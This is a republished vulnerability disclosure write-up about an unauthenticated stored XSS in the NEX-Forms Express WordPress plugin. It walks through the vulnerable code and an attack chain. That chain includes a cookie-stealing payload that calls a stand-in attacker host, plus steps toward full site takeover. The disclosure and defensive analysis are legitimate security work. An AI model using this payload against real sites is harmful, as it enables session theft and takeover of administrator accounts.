# :globe_with_meridians: Unauthenticated Stored XSS in NEX-Forms Express WP Form Builder (≤ 9.1.10) - CVSS 8.8 High (CVE-2026-10525)

> **Original Source:** [Unauthenticated Stored XSS in NEX-Forms Express WP Form Builder (≤ 9.1.10) - CVSS 8.8 High (CVE-2026-10525)](https://infosecwriteups.com/unauthenticated-stored-xss-in-nex-forms-express-wp-form-builder-9-1-10-cvss-8-8-high-e4bf33e67e82)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Unauthenticated Stored XSS in NEX-Forms Express WP Form Builder (≤ 9.1.10) — CVSS 8.8 High ([CVE-2026–10525](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-10525))


## *TL;DR: Any anonymous visitor can POST a JavaScript payload to NEX-Forms’ form submission endpoint. The plugin stores it unsanitized in the database. When *any* admin opens the Entries panel, the payload executes — silently, automatically, every time. Complete site takeover from a single curl command. (*[CVE-2026–10525](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-10525))


Tags: `#WordPresSecurity` `#InfoSec` `#SecurityResearch`


## 📋 Vulnerability Summary


- Plugin: NEX-Forms Express WP Form Builder

- Affected Version: ≤ 9.1.10 (latest as of 2026–03–22)

- Patched Version: Fixed

- Disclosure Status: Officially disclosed by WPScan, with vendor approval for disclosure agreement

- Vulnerability Type: Stored Cross-Site Scripting (XSS)

- CWE: CWE-79 — Improper Neutralization of Input During Web Page Generation

- CVSS 3.1 Score:8.8 HIGH

- CVSS Vector: `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`

- Auth Required: ❌ None — fully unauthenticated

- Admin Interaction: ✅ Viewing the Entries page (routine workflow)

- Scope Change: ✅ Crosses from visitor context into privileged admin session

## 🔍 Introduction


NEX-Forms Express WP Form Builder is a widely deployed WordPress form plugin. While reviewing its form submission pipeline, I found a stored Cross-Site Scripting vulnerability that requires zero authentication to exploit and results in full WordPress administrator compromise.


## Get Sandiyo Christan’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


The vulnerability chains three distinct weaknesses:


- An open AJAX handler accessible without login

- Missing HTML sanitization for array-type form fields

- Unescaped output rendering in the WordPress admin panel


Together, these allow a remote attacker to permanently plant malicious JavaScript that fires in every administrator’s browser — automatically, every time they view the form entries.

## ⛓️ Root Cause: Three Weaknesses, One Chain


## Weakness 1 — Open AJAX Handler (`main.php:2656`)


WordPress has two AJAX hook prefixes: `wp_ajax_` (logged-in users) and `wp_ajax_nopriv_` (anonymous users). NEX-Forms registers both for its form submission handler:


```
add_action( 'wp_ajax_submit_nex_form', 'submit_nex_form' );
add_action( 'wp_ajax_nopriv_submit_nex_form', 'submit_nex_form' ); // ← anonymous access
```


Registering a `nopriv` handler is legitimate for a public contact form. The problem is what the handler does — there's no nonce verification, no CSRF check, and no rate limiting:


```
function submit_nex_form($entry_action = false) {
// ONLY check: honeypot field must be empty
if ((sanitize_text_field($_POST['company_url']) != '') || strstr(..., '@qq.com'))
die();
// No: wp_verify_nonce(), check_ajax_referer(), current_user_can()
// → proceeds directly to processing POST data
```


Leave `company_url` empty and avoid a `@qq.com` address — you're in.

## Weakness 2 — Array Fields Skip Sanitization (`main.php:2883`)


Inside the handler, form fields from `$_POST` are processed in a loop. Here's the critical divergence:


```
if (is_array($val) || is_object($val)) {
// ← CWE-79: rest_sanitize_array() does NO HTML stripping
$data_array[] = [
'field_name' => $key,
'field_value' => rest_sanitize_array($val),
];
} else {
$val = strip_tags($val); // ← scalar fields ARE stripped ✓
$data_array[] = ['field_name' => $key,
'field_value' => sanitize_text_field(str_replace('\\', '', $val))];
}
```


>

*⚠️ The key fact: *`*rest_sanitize_array()*`* is a WordPress REST API utility. Its entire implementation is *`*return array_values($data)*`* — it reindexes the array and does nothing else. No HTML stripping. No entity encoding. Raw *`*<script>*`*, *`*<img onerror>*`*, and any other HTML passes straight through.*


The fix for scalar fields is right there in the `else` branch. The developer correctly applied `strip_tags()` to strings but chose the wrong function for array inputs.

## Weakness 3 — Raw Echo in Admin View (`class.db.php:2624`)


When an admin opens an entry in the NEX-Forms dashboard, `populate_form_entry()` decodes the stored JSON and renders each field into an HTML table. For array-type values:


```
foreach ($field_value as $val) {
// ...
$output .= rtrim($val, ', ') . '<br />'; // ← no esc_html(), raw HTML output
}
```


`rtrim()` strips trailing commas and spaces. That's it. The stored `<img src=x onerror=alert(document.domain)>` is written verbatim into `$output`, which is echoed directly into the admin page. WordPress's `esc_html()` — a one-character fix — was never applied.

## 🔀 Attack Chain


```
Unauthenticated Attacker
│
│ 1. HTTP POST — no credentials, no nonce, no CSRF token
│ action=submit_nex_form
│ nex_forms_Id=1
│ company_url= ← honeypot bypassed (empty)
│ email=attacker@evil.com
│ payload[]=<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>
│
▼
wp_ajax_nopriv_ handler fires
submit_nex_form() passes honeypot check
rest_sanitize_array() stores raw HTML → wp_wap_nex_forms_entries.form_data
│
│ 2. Normal admin workflow: NEX-Forms → Entries
│ (no special action required)
│
▼
populate_form_entry() decodes JSON
rtrim($val) echoed without esc_html()
<img src=x onerror=...> written directly into admin page DOM
│
▼
Browser renders admin page
onerror fires automatically (no click required)
Session cookie exfiltrated to attacker's server
│
▼
COMPLETE SITE TAKEOVER
→ Rogue admin account created
→ Backdoor plugin installed
→ Full database exfiltrated
```

---

*Originally published on [Medium](https://infosecwriteups.com/unauthenticated-stored-xss-in-nex-forms-express-wp-form-builder-9-1-10-cvss-8-8-high-e4bf33e67e82). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
